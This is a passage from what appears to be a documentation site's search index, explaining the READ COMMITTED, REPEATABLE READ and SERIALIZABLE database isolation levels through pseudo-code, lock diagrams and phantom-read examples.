accounts WHERE id = 1\"\n    ).fetchone()[0]\n    print(f\"First read: {balance1}\")  # e.g., $1000\n\n    # If another transaction is updating this row:\n    # - READ UNCOMMITTED: Would see uncommitted value\n    # - READ COMMITTED: Waits until other transaction commits/rollback\n\n    time.sleep(2)  # Another transaction commits changes\n\n    # Read 2: Might get different value (non-repeatable read)\n    balance2 = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1\"\n    ).fetchone()[0]\n    print(f\"Second read: {balance2}\")  # e.g., $500 (DIFFERENT!)\n\n    # Can't rely on consistent reads within transaction\n    if balance1 != balance2:\n        print(\"Non-repeatable read occurred!\")\n\n    db.commit()\n\n\n# Real-world use case: Banking transaction\ndef process_payment(db, account_id, amount):\n    \"\"\"Typical banking transaction with READ COMMITTED\"\"\"\n    db.set_isolation_level(\"READ COMMITTED\")\n    db.begin()\n\n    try:\n        # Read current balance (committed values only)\n        result = db.execute(\n            \"SELECT balance FROM accounts WHERE id = ? FOR UPDATE\",\n            [account_id]\n        )\n        balance = result.fetchone()[0]\n\n        # Check sufficient funds\n        if balance &lt; amount:\n            raise InsufficientFundsError()\n\n        # Deduct amount\n        db.execute(\n            \"UPDATE accounts SET balance = balance - ? WHERE id = ?\",\n            [amount, account_id]\n        )\n\n        # Record transaction\n        db.execute(\n            \"INSERT INTO transactions (account_id, amount, type) VALUES (?, ?, 'debit')\",\n            [account_id, amount]\n        )\n\n        db.commit()\n        return True\n\n    except Exception as e:\n        db.rollback()\n        return False\n\n\n# Handling non-repeatable reads\ndef generate_report_with_read_committed(db):\n    \"\"\"Report generation - must handle non-repeatable reads\"\"\"\n    db.set_isolation_level(\"READ COMMITTED\")\n    db.begin()\n\n    # Strategy 1: Use single query to avoid inconsistency\n    result = db.execute(\"\"\"\n        SELECT \n            COUNT(*) as total_orders,\n            SUM(amount) as total_revenue,\n            AVG(amount) as avg_order\n        FROM orders\n        WHERE created_date = CURRENT_DATE\n    \"\"\").fetchone()\n\n    # All values from same snapshot (within single query)\n    print(f\"Orders: {result[0]}, Revenue: {result[1]}, Avg: {result[2]}\")\n\n    db.commit()\n</code></pre> <p>Advantages: - \u2705 No dirty reads - only see committed data - \u2705 Good balance - performance vs consistency - \u2705 Default in most databases - well-tested and reliable - \u2705 Sufficient for most use cases - OLTP applications</p> <p>Disadvantages: - \u274c Non-repeatable reads - same query, different results - \u274c Phantom reads - row counts can change - \u274c Not suitable for complex analytics - inconsistent aggregations</p> <p>When to Use: - Default choice for most applications - OLTP workloads (e.g., e-commerce, banking) - Web applications - When dirty reads are unacceptable but some inconsistency is OK</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#33-repeatable-read","title":"3.3 Repeatable Read","text":"<p>Description:</p> <p>A stronger isolation level that guarantees once a transaction reads a row, all subsequent reads of that row within the same transaction will return the same value. The transaction gets a consistent view of the data it has read, even if other transactions modify and commit changes to those rows concurrently.</p> <p>Key Characteristics:</p> <ul> <li>Consistent row-level reads - same row always returns same value within a transaction</li> <li>Long-duration read locks - held until transaction commits (not just during read)</li> <li>Prevents dirty and non-repeatable reads - data you've read cannot change</li> <li>Still allows phantom reads - NEW rows can appear in range queries</li> <li>Default in MySQL InnoDB - well-suited for financial applications</li> <li>Higher lock overhead - more blocking, potential for deadlocks</li> </ul> <p>Locking Strategy:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     REPEATABLE READ - Locking Strategy                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 READ Operations:                                        \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Acquires SHARED READ LOCKS               \u2502         \u2502\n\u2502 \u2502 \u2022 Holds locks until COMMIT/ROLLBACK        \u2502         \u2502\n\u2502 \u2502 \u2022 Locks ALL rows read                      \u2502         \u2502\n\u2502 \u2502 \u2022 Prevents other transactions from         \u2502         \u2502\n\u2502 \u2502   modifying locked rows                    \u2502         \u2502\n\u2502 \u2502 \u2022 Does NOT lock \"gaps\" or ranges           \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 WRITE Operations:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Acquires EXCLUSIVE WRITE LOCKS           \u2502         \u2502\n\u2502 \u2502 \u2022 Holds locks until COMMIT/ROLLBACK        \u2502         \u2502\n\u2502 \u2502 \u2022 Blocks ALL conflicting operations        \u2502         \u2502\n\u2502 \u2502 \u2022 Prevents lost updates                    \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 Lock Compatibility Matrix:                              \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                   \u2502\n\u2502 \u2502            \u2502  Read    \u2502  Write   \u2502                   \u2502\n\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                   \u2502\n\u2502 \u2502 Read       \u2502   \u2713      \u2502    \u2717     \u2502 (blocks)          \u2502\n\u2502 \u2502 Write      \u2502   \u2717      \u2502    \u2717     \u2502 (blocks)          \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                   \u2502\n\u2502                                                         \u2502\n\u2502 Lock Duration Comparison:                               \u2502\n\u2502                                                         \u2502\n\u2502 READ COMMITTED:                                         \u2502\n\u2502 Transaction \u251c\u2500 Read row 1 (acquire lock)               \u2502\n\u2502             \u251c\u2500 Release lock                            \u2502\n\u2502             \u251c\u2500 Read row 2 (acquire lock)               \u2502\n\u2502             \u251c\u2500 Release lock                            \u2502\n\u2502             \u2514\u2500 COMMIT                                  \u2502\n\u2502                                                         \u2502\n\u2502 REPEATABLE READ:                                        \u2502\n\u2502 Transaction \u251c\u2500 Read row 1 (acquire lock) \ud83d\udd12            \u2502\n\u2502             \u251c\u2500 Read row 2 (acquire lock) \ud83d\udd12            \u2502\n\u2502             \u251c\u2500 ... (locks held)       \ud83d\udd12\ud83d\udd12             \u2502\n\u2502             \u2514\u2500 COMMIT (release all)   \ud83d\udd13\ud83d\udd13             \u2502\n\u2502                                                         \u2502\n\u2502 Two Implementation Approaches:                          \u2502\n\u2502                                                         \u2502\n\u2502 1. Lock-Based (Traditional):                           \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Shared locks on all rows read      \u2502            \u2502\n\u2502    \u2502 \u2022 Locks held until commit            \u2502            \u2502\n\u2502    \u2502 \u2022 Blocks conflicting transactions    \u2502            \u2502\n\u2502    \u2502 \u2022 Can cause deadlocks                \u2502            \u2502\n\u2502    \u2502 \u2022 Used by: SQL Server, DB2           \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. MVCC-Based (Modern):                                \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Snapshot at transaction start      \u2502            \u2502\n\u2502    \u2502 \u2022 No locks for reads (!)             \u2502            \u2502\n\u2502    \u2502 \u2022 Reads never block writes           \u2502            \u2502\n\u2502    \u2502 \u2022 Writes never block reads           \u2502            \u2502\n\u2502    \u2502 \u2022 Uses version chains                \u2502            \u2502\n\u2502    \u2502 \u2022 Used by: MySQL InnoDB, PostgreSQL  \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 Phantom Reads - Why Still Possible:                    \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Locks acquired:  Individual ROWS           \u2502         \u2502\n\u2502 \u2502 Locks NOT on:    RANGES or GAPS            \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 T1 reads rows: [A, B, C] \u2190 Locked         \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 T2 inserts:    [D] \u2190 NOT blocked!         \u2502         \u2502\n\u2502 \u2502 (D not locked because didn't exist)        \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 T1 re-reads:   [A, B, C, D] \u2190 PHANTOM!    \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>How Locking Works (Lock-Based):</p> <pre><code>Scenario: Traditional lock-based REPEATABLE READ\n\nT1: BEGIN\nT1: SELECT * FROM accounts WHERE id IN (1, 2, 3)\n    \u2193\n    Acquires SHARED LOCKS on rows 1, 2, 3\n    [Row 1: SHARED LOCKED by T1] \ud83d\udd12\n    [Row 2: SHARED LOCKED by T1] \ud83d\udd12\n    [Row 3: SHARED LOCKED by T1] \ud83d\udd12\n    Reads: [row1, row2, row3]\n    Locks HELD (not released!)\n\nT2: BEGIN\nT2: UPDATE accounts SET balance = 500 WHERE id = 2\n    \u2193\n    Tries to acquire EXCLUSIVE WRITE LOCK on row 2\n    \u2193\n    BLOCKED! (T1 holds shared lock on row 2)\n    \u2193\n    [T2 WAITS...]\n\nT1: SELECT * FROM accounts WHERE id IN (1, 2, 3)\n    \u2193\n    Uses existing SHARED LOCKS (already held)\n    Reads: [row1, row2, row3] \u2713 SAME VALUES!\n    Locks STILL HELD \ud83d\udd12\ud83d\udd12\ud83d\udd12\n\nT1: COMMIT\n    \u2193\n    Releases all SHARED LOCKS \ud83d\udd13\ud83d\udd13\ud83d\udd13\n\nT2: [UNBLOCKED]\n    \u2193\n    Acquires EXCLUSIVE WRITE LOCK on row 2\n    Updates row 2\nT2: COMMIT\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nResult: T1 saw consistent values (no non-repeatable reads)\nCause: Shared locks held for entire transaction duration\n</code></pre> <p>How MVCC Works (MySQL InnoDB):</p> <pre><code>Scenario: MVCC-based REPEATABLE READ (MySQL InnoDB)\n\nDatabase maintains multiple versions of each row:\n\n[Row 1: balance=1000, version=100, txn_id=50]\n\nT1: BEGIN (assigned txn_id=100)\n    \u2193\n    Creates SNAPSHOT at txn_id=100\n    [Snapshot: sees all data committed before txn_id=100]\n\nT1: SELECT balance FROM accounts WHERE id = 1\n    \u2193\n    Reads using snapshot (txn_id=100)\n    Finds version: balance=1000 (from txn_id=50)\n    Returns: 1000\n    \u2193\n    NO LOCKS ACQUIRED! \u2713\n\nT2: BEGIN (assigned txn_id=101)\nT2: UPDATE accounts SET balance = 500 WHERE id = 1\n    \u2193\n    Creates NEW version of row 1\n    [Row 1: balance=500, version=101, txn_id=101] \u2190 NEW\n    [Row 1: balance=1000, version=100, txn_id=50] \u2190 OLD (kept!)\nT2: COMMIT\n\nT1: SELECT balance FROM accounts WHERE id = 1\n    \u2193\n    Still uses snapshot (txn_id=100)\n    Ignores version 101 (created after snapshot)\n    Reads version 100: balance=1000 \u2713 SAME VALUE!\n    \u2193\n    NO LOCKS, NO WAITING! \u2713\n\nT1: COMMIT\n    \u2193\n    Snapshot discarded\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAdvantages of MVCC approach:\n\u2022 No read locks needed\n\u2022 Readers don't block writers\n\u2022 Writers don't block readers\n\u2022 Better concurrency\n\u2022 No deadlocks from read locks\n</code></pre> <p>Phantom Reads Example:</p> <pre><code>Why phantoms still occur (even with row locks):\n\nT1: BEGIN\nT1: SELECT COUNT(*) FROM orders WHERE status = 'pending'\n    \u2193\n    Finds rows: [order_1, order_2, order_3]\n    Locks these 3 rows: \ud83d\udd12\ud83d\udd12\ud83d\udd12\n    Returns: COUNT = 3\n\nT2: BEGIN\nT2: INSERT INTO orders (status) VALUES ('pending')\n    \u2193\n    Creates new row: [order_4]\n    \u2193\n    NOT BLOCKED! (order_4 wasn't locked by T1)\n    \u2193\n    SUCCESS \u2713\nT2: COMMIT\n    [order_4 now exists and committed]\n\nT1: SELECT COUNT(*) FROM orders WHERE status = 'pending'\n    \u2193\n    Finds rows: [order_1, order_2, order_3, order_4]\n    Still holds locks on first 3: \ud83d\udd12\ud83d\udd12\ud83d\udd12\n    But sees new row order_4 (not locked)\n    Returns: COUNT = 4 \u2190 PHANTOM!\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nProblem: REPEATABLE READ locks ROWS, not RANGES\nSolution: Use SERIALIZABLE (locks ranges/gaps)\n</code></pre> <p>How it Works:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           REPEATABLE READ - How it Works                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  \u2022 Acquires read locks on rows read                     \u2502\n\u2502  \u2022 Holds read locks until transaction ends              \u2502\n\u2502  \u2022 Same row always returns same value                   \u2502\n\u2502  \u2022 New rows can still appear (phantoms)                 \u2502\n\u2502                                                         \u2502\n\u2502  Transaction 1          Database          Transaction 2 \u2502\n\u2502                                                         \u2502\n\u2502  READ x = 5             [x = 5]                         \u2502\n\u2502  (acquires lock) \u2500\u2500\u2500\u2500\u2500\u2192 \ud83d\udd12 LOCKED                       \u2502\n\u2502                            \u2551                            \u2502\n\u2502                            \u2551      UPDATE x = 10         \u2502\n\u2502                            \u2551         \u2193 BLOCKED!         \u2502\n\u2502                            \u2551      [waiting...]          \u2502\n\u2502  READ x = 5 \u2713           [x = 5]                         \u2502\n\u2502  (same value!)          \ud83d\udd12 STILL LOCKED                  \u2502\n\u2502                            \u2551                            \u2502\n\u2502  COMMIT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 \ud83d\udd13 UNLOCKED                    \u2502\n\u2502  (releases lock)           \u2193                            \u2502\n\u2502                         [x = 10] \u2190 T2 can now update    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Diagram:</p> <pre><code>REPEATABLE READ - Consistent Row Reads:\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 T1: BEGIN                                            \u2502\n\u2502 T1: READ row with id=1 (balance=1000)                \u2502\n\u2502     \u2193                                                \u2502\n\u2502     [id=1, balance=1000] \ud83d\udd12 LOCKED for T1            \u2502\n\u2502         \u2551                                            \u2502\n\u2502         \u2551\u2550\u2550&gt; T2: UPDATE id=1, balance=500            \u2502\n\u2502         \u2551    \u2193 BLOCKED! (can't modify locked row)   \u2502\n\u2502         \u2551    [waiting for T1 to commit...]           \u2502\n\u2502     \u2193   \u2551                                            \u2502\n\u2502 T1: READ row with id=1 (balance=1000) \u2713              \u2502\n\u2502     SAME VALUE! \u2190 REPEATABLE READ                    \u2502\n\u2502     \u2551                                                \u2502\n\u2502 T1: COMMIT                                           \u2502\n\u2502     \ud83d\udd13 UNLOCKED                                       \u2502\n\u2502         \u2551                                            \u2502\n\u2502         \u255a\u2550\u2550&gt; T2: UPDATE completes                    \u2502\n\u2502              [id=1, balance=500]                     \u2502\n\u2502              T2: COMMIT                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nBut allows Phantom Reads (new rows):\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 T1: SELECT COUNT(*) WHERE status='pending'           \u2502\n\u2502     \u2192 Returns 10 (locks these 10 rows)               \u2502\n\u2502         \u2193                                            \u2502\n\u2502         \u2514\u2500\u2500\u2192 T2: INSERT new row (status='pending')   \u2502\n\u2502              T2: COMMIT \u2713 (allowed!)                 \u2502\n\u2502     \u2193                                                \u2502\n\u2502 T1: SELECT COUNT(*) WHERE status='pending'           \u2502\n\u2502     \u2192 Returns 11 \u2190 PHANTOM READ!                     \u2502\n\u2502                                                      \u2502\n\u2502 Existing rows: LOCKED (repeatable)                   \u2502\n\u2502 New rows: NOT LOCKED (can be inserted)               \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nProblems Allowed:\n\u2713 Dirty Read        - NO\n\u2713 Non-Repeatable    - NO\n\u2717 Phantom Read      - YES\n</code></pre> <p>Pseudo Code:</p> <pre><code># REPEATABLE READ Example\n\ndef repeatable_read_transaction(db):\n    \"\"\"Demonstrates REPEATABLE READ behavior\"\"\"\n    db.set_isolation_level(\"REPEATABLE READ\")\n    db.begin()\n\n    # First read\n    balance1 = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1\"\n    ).fetchone()[0]\n    print(f\"First read: {balance1}\")  # $1000\n\n    # This row is now locked for the duration of this transaction\n    # Other transactions can't modify it\n\n    time.sleep(5)  # Other transactions try to update but are blocked\n\n    # Second read - GUARANTEED to return same value\n    balance2 = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1\"\n    ).fetchone()[0]\n    print(f\"Second read: {balance2}\")  # $1000 (SAME!)\n\n    assert balance1 == balance2  # Always true!\n\n    db.commit()  # Now other transactions can proceed\n\n\n# Real-world use: Multi-step calculation\ndef calculate_account_interest(db, account_id):\n    \"\"\"Calculate interest - needs consistent balance\"\"\"\n    db.set_isolation_level(\"REPEATABLE READ\")\n    db.begin()\n\n    try:\n        # Read balance (locks the row)\n        balance = db.execute(\n            \"SELECT balance FROM accounts WHERE id = ?\",\n            [account_id]\n        ).fetchone()[0]\n\n        # Complex calculation (takes time)\n        monthly_rate = get_interest_rate(account_id)  # External call\n        interest = balance * monthly_rate\n\n        time.sleep(1)  # Simulate processing\n\n        # Read balance again - GUARANTEED same value\n        # Even if we need to re-read for verification\n        balance_verify = db.execute(\n            \"SELECT balance FROM accounts WHERE id = ?\",\n            [account_id]\n        ).fetchone()[0]\n\n        assert balance == balance_verify  # Always passes!\n\n        # Apply interest\n        new_balance = balance + interest\n        db.execute(\n            \"UPDATE accounts SET balance = ? WHERE id = ?\",\n            [new_balance, account_id]\n        )\n\n        db.commit()\n        return interest\n\n    except Exception as e:\n        db.rollback()\n        raise\n\n\n# Phantom read example (still possible!)\ndef count_pending_orders(db):\n    \"\"\"Demonstrates phantom reads in REPEATABLE READ\"\"\"\n    db.set_isolation_level(\"REPEATABLE READ\")\n    db.begin()\n\n    # First count\n    count1 = db.execute(\n        \"SELECT COUNT(*) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n    print(f\"First count: {count1}\")  # 100\n\n    # Existing rows are locked, but NEW rows can be inserted\n    time.sleep(2)  # Another transaction inserts new orders\n\n    # Second count - MAY BE DIFFERENT (phantom!)\n    count2 = db.execute(\n        \"SELECT COUNT(*) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n    print(f\"Second count: {count2}\")  # 105 (PHANTOMS!)\n\n    # Individual existing rows are repeatable,\n    # but count can change due to inserts\n\n    db.commit()\n\n\n# MySQL/InnoDB specific: Uses snapshot isolation (no phantoms!)\ndef mysql_repeatable_read(db):\n    \"\"\"MySQL REPEATABLE READ prevents phantoms too!\"\"\"\n    # MySQL InnoDB uses MVCC (snapshot isolation)\n    db.set_isolation_level(\"REPEATABLE READ\")\n    db.begin()\n\n    # Creates a snapshot of database\n    count1 = db.execute(\n        \"SELECT COUNT(*) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n\n    time.sleep(2)  # Other transactions insert rows\n\n    # In MySQL: Still sees same count (no phantoms!)\n    count2 = db.execute(\n        \"SELECT COUNT(*) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n\n    assert count1 == count2  # True in MySQL!\n\n    db.commit()\n</code></pre> <p>Advantages: - \u2705 Consistent row reads - same row, same value - \u2705 No dirty reads - only committed data - \u2705 No non-repeatable reads - values don't change - \u2705 Good for complex calculations - can rely on data - \u2705 Default in MySQL - well-supported</p> <p>Disadvantages: - \u274c Still allows phantom reads - counts can change - \u274c More locking - reduced concurrency - \u274c Potential deadlocks - transactions hold locks longer - \u274c Performance impact - blocking other transactions</p> <p>When to Use: - Financial calculations requiring consistent values - Multi-step transactions that re-read data - Reports that need stable row values - When non-repeatable reads are unacceptable</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#34-serializable","title":"3.4 Serializable","text":"<p>Description:</p> <p>The strictest and strongest isolation level, providing complete isolation between concurrent transactions. At this level, transactions execute as if they were running serially (one after another in sequence), even though they may actually be running concurrently. This guarantees perfect consistency and prevents all concurrency anomalies.</p> <p>Key Characteristics:</p> <ul> <li>Complete isolation - transactions appear to run one at a time</li> <li>Range/predicate locks - locks not just rows, but ranges and gaps</li> <li>No anomalies - prevents dirty, non-repeatable, and phantom reads</li> <li>Lowest concurrency - significant blocking and waiting</li> <li>Serialization failures - transactions may abort due to conflicts</li> <li>Perfect correctness - simplest consistency model for developers</li> <li>Performance cost - highest overhead, slowest throughput</li> </ul> 